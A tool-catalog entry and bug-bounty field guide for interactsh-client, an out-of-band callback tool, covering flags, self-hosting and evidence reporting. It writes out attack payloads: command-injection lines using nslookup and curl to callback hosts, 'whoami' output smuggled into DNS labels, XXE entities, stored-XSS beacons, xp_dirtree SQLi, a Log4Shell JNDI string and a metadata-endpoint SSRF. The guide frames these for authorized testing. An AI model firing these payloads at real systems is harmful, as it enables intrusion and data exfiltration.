---
name: "interactsh-client"
categories:
  - blackarch-webapp
version: "v1.4.1.r2.g49c579a"
homepage: "https://github.com/projectdiscovery/interactsh"
packaged-by: [blackarch, aur]
blackarch-builddate: "2026-10-31"
build-system: go
license: MIT
meta-checked: "2026-11-09"
github-repo: "projectdiscovery/interactsh"
github-stars: 4617
github-pushed: "2026-11-04"
github-archived: false
github-issues: 2
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 172
gh-activity-checked: "2026-11-09"
---

# interactsh-client

> Out-of-band data extraction client: mints a unique callback domain, then live-prints every DNS/HTTP/SMTP interaction it receives.

## What it's for

The client half of ProjectDiscovery's Interactsh OOB testing platform. It registers a unique correlation ID with an Interactsh server (the public oast.pro/oast.live/... pool by default, or a self-hosted one), prints the generated payload domain, and then polls and streams every interaction that domain receives — DNS lookups, HTTP(S) requests, SMTP sessions — with source IP and timestamp. Embed the domain wherever a blind injection needs proof of execution (SSRF, XXE, blind RCE command execution, password-reset poisoning), and the callback you cannot see in the application's response shows up here. Sessions survive restarts, output can be JSONL, and interactions can be matched or filtered by pattern.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Get a payload domain and watch for callbacks

The default monitoring run.

```
interactsh-client
```

Outcome: prints a unique OOB domain (e.g. `c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro`) under `[INF] Listing 1 payload for OOB Testing`, then one line per interaction as it arrives — `Received DNS interaction (A) from <ip>`, `Received HTTP interaction from <ip>`, SMTP and so on, each with a timestamp.

### Persist a session and log verbosely

Keep the same payload domain across restarts with full detail.

```
interactsh-client -sf interact.session -v -o logs.txt
```

Outcome: the correlation ID is stored in `interact.session` so a later rerun resumes polling the same domain; verbose mode additionally logs full request/response content, with everything also written to `logs.txt`.

### Filter interactions to the signal

Cut callback noise down to what matters.

```
interactsh-client -m "token|password" -json
```

Outcome: only interactions whose data matches the pattern are displayed (`-f` inverts this to a drop-list), and each is emitted as a JSON line — e.g. keeping only token-bearing HTTP callbacks out of scanner background chatter.

### Use a self-hosted, protected server

Keep OOB traffic entirely on your own infrastructure.

```
interactsh-client -server oast.example.com -token XXX
```

Outcome: the client registers against your own Interactsh server instead of the public defaults, authenticating with the server's token — callbacks never transit third-party infrastructure (combine with `-n` to mint several payload domains at once).

---

## Bug bounty workflow with interactsh-client

interactsh-client is not a scanner — it is the *oracle* that turns a blind vulnerability into a proven one. A blind SSRF, blind RCE, blind XXE, out-of-band SQLi, or stored XSS that fires in a browser you never see all share one problem: the vulnerable response tells you nothing. interactsh-client gives you a domain the target can reach, then records the moment it does. The entire discipline is: **mint a uniquely attributable callback domain, plant it in exactly one injection point, and capture the interaction log entry (protocol, source IP, timestamp) as the proof.** Everything below assumes an authorized program, single-request/low-volume seeding, and benign beacons that prove reachability without exfiltrating real data.

### Phase 0 — Decide your OOB infrastructure (public pool vs self-hosted)

Before you mint a single payload, choose where callbacks land, because this is a *scope and privacy* decision, not a convenience one.

- **Public OAST pool (default):** `-server` defaults to `oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me`. Zero setup. But every payload domain you mint is a subdomain of a third party's zone: it resolves through public DNS, the pool operator's servers physically terminate the callback, and the subdomains are visible to anyone scraping passive-DNS feeds. The payload domain encodes *what you are testing where* — a stored-XSS beacon that fires inside `admin.example.com` reveals the target to the operator. Per the release announcement the server holds data only in memory with no server-side logging and encrypts each interaction to your client, but that is a policy and crypto claim, not a scope guarantee. **Some programs forbid routing their data through third-party OOB services** — read the rules of engagement.
- **Self-hosted (`-server oast.example.com -token XXX`):** you run `interactsh-server -domain oast.example.com` on a VPS whose `ns1`/`ns2` glue points at it (a $5 droplet handles it; open inbound DNS/HTTP/HTTPS/SMTP). Payload domains are *yours*, callbacks never touch a third party, and — critically for reporting — **you control the server log, so you can produce tamper-evident evidence you own.** Protect it with `-auth` (random token) or `-token XXX` so strangers cannot poll your interactions.

Confirm the client is healthy before relying on it:

```
interactsh-client -health-check
```

Decide persistence now too. If you will plant a *stored* payload that may not fire for hours (stored XSS in a ticket a staffer opens tomorrow; a webhook that runs on a nightly job), you must keep the *same* correlation domain alive across restarts with `-sf` (see Phase 2) — a fresh run mints a new domain and the old callback is orphaned.

### Phase 1 — Mint attributable payloads

The cardinal rule: **one payload domain per injection point.** If you paste the same `abcd….oast.pro` into ten fields and a DNS callback arrives, you cannot say which field fired it — attribution is gone and the finding is unprovable. Mint a batch and spend them one per sink:

```
interactsh-client -n 10 -ps -o run1.jsonl -json
```

`-n 10` generates ten payload domains up front; `-ps` (payload-store) writes them to `interactsh_payload.txt` (rename with `-psf`) so you have a ledger mapping domain → sink; `-json -o` streams every interaction as JSONL to disk from the first second. Keep a notebook line per payload: `payload[3] = k3b…oast.pro → POST /api/webhooks url field`.

The payload domain is a 33-character label: a 20-char correlation ID (`-cidl`) plus a 13-char nonce (`-cidn`). **Client and self-hosted server must use identical `-cidl`/`-cidn` or correlation silently fails** and no callback ever displays — a classic self-host footgun.

### Phase 2 — Seed payloads across OOB sinks (single-request, benign)

Plant one domain per candidate sink. Note the *protocol you expect back* — it is itself evidence of how far execution got.

- **Blind SSRF** — URL fields, webhooks, "import from URL", avatar/preview/PDF fetchers: submit `http://k3b….oast.pro/ssrf1`. A DNS **and** HTTP callback proves the server made the request. Escalate only within program rules (e.g. a follow-up to `http://169.254.169.254/` to prove metadata reach).
- **Blind OS command injection / RCE** — inject `;nslookup cmd1.k3b….oast.pro` or `$(curl http://k3b….oast.pro/rce1)`. A DNS callback alone proves code execution (the shell resolved your host). Encode command output into the label for proof-of-depth: `` nslookup `whoami`.k3b….oast.pro `` yields a DNS query like `www-data.k3b….oast.pro` — the label *is* your output (nested subdomains work on the public pool; a self-hosted server needs `-wildcard` to catch arbitrary sub-labels).
- **Blind XXE** — external-entity / OOB DTD exfiltration: `<!ENTITY % x SYSTEM "http://k3b….oast.pro/xxe.dtd">`. HTTP callback = the parser fetched your entity.
- **Blind / stored XSS** — `<script src=//k3b….oast.pro></script>` or an `<img src>` beacon placed where it renders in a privileged context. The callback's **source IP and User-Agent** show whose browser (and from which network) executed it. Use `-sf` here so the domain survives until it fires.
- **Out-of-band SQLi** — DB-specific DNS exfil (MSSQL `xp_dirtree \\k3b….oast.pro\a`, Oracle `UTL_HTTP`, MySQL `LOAD_FILE` UNC on Windows). DNS callback from the DB host = confirmed injection on a boolean/blind endpoint that leaks nothing in-band.
- **Log4Shell / JNDI** — `${jndi:ldap://k3b….oast.pro/x}`. Start the self-hosted server's LDAP listener (`-ldap`) to catch and log the LDAP leg.
- **SMTP header / email injection** — a callback of type SMTP confirms the app opened a mail session to your host.

### Phase 3 — Poll, correlate, and separate signal from noise

Leave the client polling (default `-poll-interval 5` seconds) while you seed. Each arrival prints protocol, remote IP, and timestamp. Three jobs here:

1. **Correlate** the 33-char `unique-id` in each interaction back to the payload you planted (your Phase-1 ledger). The nonce makes each domain unique even within one correlation ID, so matching is exact.
2. **Classify the protocol.** A DNS-only interaction proves only that *something on the resolution path* looked up your name — necessary but weaker. An HTTP/SMTP/LDAP interaction proves the target actually connected. For SSRF/RCE you usually want the HTTP leg; for blind SQLi the DNS leg is often all the DB can emit.
3. **Reject spurious callbacks.** Security products, mail gateways, link-preview bots and corporate proxies *prefetch* URLs — a callback from Microsoft/Google/Cloudflare scanning ranges is **noise, not a finding.** Enrich with `-asn` (adds the remote IP's ASN to JSON output) and keep only interactions whose source IP/ASN matches the target's known egress. Cut chatter with `-match`/`-filter`:

```
interactsh-client -asn -json -o evidence.jsonl -m "ssrf1|rce1"
```

### Phase 4 — Confirm reachability vs execution, then stop

Distinguish the three levels of proof before you write the report: (a) *your domain resolved* (DNS, from any resolver) — weakest; (b) *the target connected* (HTTP/SMTP from the target's egress IP) — SSRF/XXE confirmed; (c) *the target executed your output* (a label carrying `whoami`/`id` output, or an HTTP body echoing an internal response) — RCE/exfil confirmed. Climb exactly as far as the program allows and no further. One or two confirming requests settle it; do not loop payloads to "be sure" — that is volume the program did not authorize.

### Phase 5 — Preserve evidence

The public server is memory-only with eviction — **if you did not write it to disk, the callback is gone.** Your `-json -o` file and (if self-hosted) the server log are the artifacts. See *Reporting evidence* below.

---

## Where the money is with interactsh-client

interactsh-client does not *find* bugs; it *confirms* the blind ones that pay the most precisely because they are invisible in-band. Priority by payout and the callback that proves each:

| Finding class | How interactsh-client reaches it | Proving callback | Typical severity | Dupe risk |
|---|---|---|---|---|
| Blind SSRF (webhooks, URL import, previews, PDF/SVG render) | Plant `http://<id>.oast…/ssrf` in the URL field | DNS **+ HTTP** from target egress IP | High → Critical (if metadata/internal reach) | Medium |
| Blind OS command injection / RCE | `;nslookup <id>.oast…` / `$(curl …)`; output in DNS label | DNS from target; label carries command output | Critical | Low–Medium |
| Out-of-band SQLi (blind/boolean endpoints) | DB-native DNS/UNC exfil (`xp_dirtree`, `UTL_HTTP`, `LOAD_FILE`) | DNS from the DB host | Critical | Low |
| Blind XXE / OOB entity exfil | External-entity or param-entity DTD pointing at your host | HTTP (DTD fetch), DNS | High | Medium |
| Stored / blind XSS firing in privileged UI | `<script src>`/`<img>` beacon where staff render it | HTTP with victim source IP + User-Agent | High | Medium |
| Log4Shell / JNDI injection | `${jndi:ldap://<id>.oast…/x}` + server `-ldap` | LDAP (and DNS) interaction | Critical | High (well-trodden) |
| SMTP/email header injection | Payload host in a mail-triggering field | SMTP session to your host | Medium–High | Medium |
| CRLF / Host-header → server-side fetch | Poisoned header that makes the app call out | DNS/HTTP | Medium | Medium |

The two under-contested seams: **out-of-band SQLi** (most hunters stop at boolean-blind and never try DNS exfil) and **RCE output smuggled into the DNS label** (turns a bare "DNS resolved" into "here is `whoami` from your box"). The crowded one is JNDI/Log4Shell — valuable but heavily duped; lead with the interaction log timestamp to prove *your* request caused *this* callback.

---

## Command recipes

Annotated command → expected output. Low-volume settings called out.

**Baseline monitor, evidence on from second one.**

```
interactsh-client -json -o evidence.jsonl
```
→ Prints one payload domain under `[INF] Listing 1 payload for OOB Testing`, then one JSONL line per interaction to `evidence.jsonl` (each with `protocol`, `unique-id`, `remote-address`, `timestamp`, raw request). Writing from the start means an evicted callback is still on your disk.

**Batch of attributable payloads with a ledger.**

```
interactsh-client -n 10 -ps -psf payloads.txt -json -o evidence.jsonl
```
→ Ten domains generated and written to `payloads.txt`; spend one per injection point so every callback maps to exactly one input.

**Persist a stored-XSS/slow-webhook session across restarts.**

```
interactsh-client -sf interact.session -json -o evidence.jsonl
```
→ Stores the correlation ID in `interact.session`; rerunning with the same `-sf` resumes the *same* domain, so a payload that fires tomorrow still correlates. Essential for stored payloads.

**Cut scanner/AV noise to the interactions that matter.**

```
interactsh-client -asn -json -o evidence.jsonl -m "ssrf1|rce1|xxe1"
```
→ `-m` keeps only interactions matching the pattern (`-f` inverts to a drop-list); `-asn` annotates the remote IP's ASN so you can tell a target-egress callback from a `Microsoft`/`Google` prefetch.

**Protocol scoping when you only care about one leg.**

```
interactsh-client -dns-only          # blind SQLi / RCE-via-DNS; ignore HTTP chatter
interactsh-client -http-only         # SSRF/XXE where the HTTP fetch is the proof
```
→ `-dns-only`/`-http-only`/`-smtp-only` filter the CLI display to one protocol.

**Self-hosted, authenticated, with LDAP for JNDI.** Server side (on the VPS):

```
interactsh-server -domain oast.example.com -token 'S3cret' -ldap -wildcard
```
→ Registers your domain, requires the token to poll, enables the LDAP listener (for `${jndi:ldap://…}`) and wildcard sub-label capture (for DNS-exfil labels). Then the client:

```
interactsh-client -server oast.example.com -token 'S3cret' -json -o evidence.jsonl
```
→ All callbacks stay on your infrastructure and in your logs.

**Pairing with nuclei** (nuclei runs its own interactsh client internally; point it at your self-hosted server for privacy):

```
nuclei -u https://example.com -iserver oast.example.com -itoken 'S3cret'
```
→ `-iserver`/`-interactsh-server` and `-itoken`/`-interactsh-token` make nuclei's OAST templates report to *your* server instead of the public pool. Tune polling with `-interactions-poll-duration` (default 5s), `-interactions-cache-size` (default 5000), `-interactions-eviction` (default 60s), `-interactions-cooldown-period` (default 5s). Keep volume sane with `-rate-limit`; `-ni`/`-no-interactsh` disables OAST entirely when a program bans it. Manual interactsh-client payloads and nuclei can share the same self-hosted server simultaneously.

---

## Pitfalls, noise and scope discipline

- **One domain, many sinks = unprovable finding.** Reusing a single payload across fields destroys attribution. Mint one per injection point (`-n`, `-ps` ledger). This is the most common self-inflicted wound.
- **The public pool leaks your target and may vanish.** Payload domains on `oast.pro` et al. are third-party subdomains visible in passive DNS; the pool rotates and goes down "at any time" per upstream. A stored payload that fires after the pool drops it loses the proof. If the program forbids third-party OOB, or the finding is time-delayed, **self-host.**
- **Memory-only, zero-logging cuts both ways.** The public server keeps nothing for you — no `-o`/`-json` means an evicted interaction is gone forever. Always write to disk the moment you start.
- **Spurious callbacks inflate severity.** URL scanners, mail gateways, link-preview and AV bots prefetch your domain; a callback is not automatically the target. Verify the source IP/ASN (`-asn`) matches the target's egress and that the timestamp follows *your* request before claiming SSRF/RCE. A DNS-only hit from a random resolver is not proof the target connected.
- **`-cidl`/`-cidn` mismatch on self-hosted = silent failure.** If client and server disagree on correlation-ID or nonce length, nothing ever correlates and you will think the bug is dead. Keep defaults (20/13) on both ends.
- **DoS and volume risk.** Huge DNS-exfil labels, long loops of "just confirming" requests, or firing thousands of nuclei OAST templates is volume the program did not authorize. Seed single requests; rate-limit nuclei (`-rate-limit`); escalate only as far as the rules allow.
- **Benign beacons only.** A stored-XSS payload can execute in a real staffer's browser. Prove execution with a bare beacon (callback with source IP/User-Agent) — do not steal cookies, session data, or exfiltrate PII into labels beyond a harmless marker. Clean up stored payloads afterward.
- **Don't over-claim from a DNS hit.** "The target resolved my domain" ≠ "the target connected" ≠ "the target executed my code." Report the level you actually proved.

---

## Reporting evidence

The interaction log entry *is* the finding. Capture, for each confirmed callback:

1. **The injecting request** — the exact HTTP request (or form field, or stored value) where you planted `<id>.oast…`, so the triager can replay it. Pair it with the request/response that looked clean in-band — that is *why* OOB was needed.
2. **The correlated interaction entry** — from `-json -o`, the JSONL line showing `protocol`, `unique-id` (the full 33-char domain, matching your payload), `remote-address` (the caller's IP), and `timestamp`. The `remote-address` tying back to the target's egress is the crux of the proof.
3. **The timeline / causality** — timestamp of *your* request vs timestamp of the callback. A callback seconds after your single request, from the target's IP, is clean causation; include both times.
4. **Protocol = depth.** State which leg fired (DNS vs HTTP vs SMTP/LDAP) and what it proves (resolution path vs actual connection vs mail/JNDI). For RCE, include the DNS label carrying command output (`www-data.<id>.oast…`); for SSRF with `-v`, include the full inbound HTTP request the victim server sent — its headers can reveal internal metadata.
5. **ASN/source corroboration** — the `-asn`-enriched entry showing the caller belongs to the target's infrastructure, not a scanner, pre-empting the "that was just a URL-preview bot" rebuttal.
6. **A log you control** — on a self-hosted server, attach the server-side log excerpt; it is tamper-evident and under your custody, which triagers trust more than a screenshot of the public pool's transient output.

Keep the raw `evidence.jsonl` and (self-hosted) server log; redact nothing from the correlation fields, and never exfiltrate more than the beacon needs.

---

## References

- Interactsh GitHub repository and README (client/server flags, default OAST servers, self-hosting) — https://github.com/projectdiscovery/interactsh
- Interactsh running guide (usage examples, default servers) — https://docs.projectdiscovery.io/tools/interactsh/running
- ProjectDiscovery release announcement, "What is Interactsh?" (RSA key exchange for key transmission, AES for data, in-memory storage, no server-side logging) — https://blog.projectdiscovery.io/interactsh-release
- Nuclei running docs — INTERACTSH flag section (`-iserver`/`-interactsh-server`, `-itoken`/`-interactsh-token`, `-interactions-cache-size`, `-interactions-eviction`, `-interactions-poll-duration`, `-interactions-cooldown-period`, `-ni`/`-no-interactsh`) — https://docs.projectdiscovery.io/tools/nuclei/running
- Nuclei + Interactsh integration overview — https://projectdiscovery.io/blog/nuclei-interactsh-integration

*Bug-bounty field-guide supplement added 2026-11-16, grounded in the Interactsh GitHub README, the ProjectDiscovery running docs, the Interactsh release announcement, and the Nuclei INTERACTSH flag reference (model: claude-opus-4-8).*
